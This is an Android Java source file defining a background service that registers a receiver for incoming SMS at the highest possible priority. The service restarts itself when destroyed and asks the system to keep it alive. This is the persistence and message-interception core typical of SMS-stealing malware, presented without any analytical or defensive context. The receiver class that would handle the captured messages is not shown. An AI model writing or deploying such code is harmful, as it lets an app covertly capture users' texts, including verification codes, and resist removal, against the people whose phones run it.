package com.bobo.service;

import android.app.Service;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.IBinder;

public class MainService extends Service{
    MainReceiver mReceiver;
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onStart(Intent intent, int startId) {
        super.onStart(intent, startId);
        IntentFilter localIntentFilter = new IntentFilter("android.provider.Telephony.SMS_RECEIVED");
        localIntentFilter.setPriority(2147483647);
        mReceiver = new MainReceiver();
        registerReceiver(mReceiver, localIntentFilter);
    }

    @Override
    public void onDestroy() {
        unregisterReceiver(mReceiver);
        Intent it = new Intent(MainService.this, MainService.class);
        this.startService(it);
    }
    
    @Override  
    public int onStartCommand(Intent intent, int flags, int startId) {  
        flags = START_STICKY;  
        return super.onStartCommand(intent, flags, startId);  
    } 
}